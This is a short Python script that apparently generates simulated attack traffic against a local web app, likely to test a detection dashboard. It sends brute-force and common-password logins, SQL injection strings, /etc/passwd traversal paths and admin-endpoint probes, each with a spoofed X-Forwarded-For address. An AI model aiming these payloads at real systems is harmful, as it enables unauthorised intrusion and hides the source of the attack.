import requests
import time
import random

TARGET = "http://127.0.0.1:7860"

# Multiple attacker IPs
ATTACKER_IPS = [
    "192.168.1.10",
    "192.168.1.11",
    "192.168.1.12",
    "10.0.0.5",
    "172.16.0.3"
]


def brute_force():
    ip = random.choice(ATTACKER_IPS)

    for i in range(5):
        requests.post(
            f"{TARGET}/login",
            data={
                "username": "admin",
                "password": "wrong"
            },
            headers={"X-Forwarded-For": ip}
        )
        time.sleep(0.3)


def port_scan():
    ip = random.choice(ATTACKER_IPS)

    endpoints = ["/admin", "/config", "/backup"]

    for ep in endpoints:
        requests.get(
            f"{TARGET}{ep}",
            headers={"X-Forwarded-For": ip}
        )


def credential_stuffing():
    ip = random.choice(ATTACKER_IPS)

    passwords = ["admin", "password", "123456"]

    for p in passwords:
        requests.post(
            f"{TARGET}/login",
            data={
                "username": "admin",
                "password": p
            },
            headers={"X-Forwarded-For": ip}
        )


def sql_injection():
    ip = random.choice(ATTACKER_IPS)

    payloads = [
        "' OR '1'='1",
        "' OR 1=1 --",
        "' UNION SELECT * FROM users --"
    ]

    for payload in payloads:
        requests.post(
            f"{TARGET}/login",
            data={
                "username": payload,
                "password": payload
            },
            headers={"X-Forwarded-For": ip}
        )


def directory_traversal():
    ip = random.choice(ATTACKER_IPS)

    paths = [
        "/../../etc/passwd",
        "/../config",
        "/../../backup"
    ]

    for path in paths:
        requests.get(
            f"{TARGET}{path}",
            headers={"X-Forwarded-For": ip}
        )


def simulate_attack():

    attacks = [
        brute_force,
        port_scan,
        credential_stuffing,
        sql_injection,
        directory_traversal
    ]

    selected = random.sample(attacks, k=3)

    for attack in selected:
        attack()
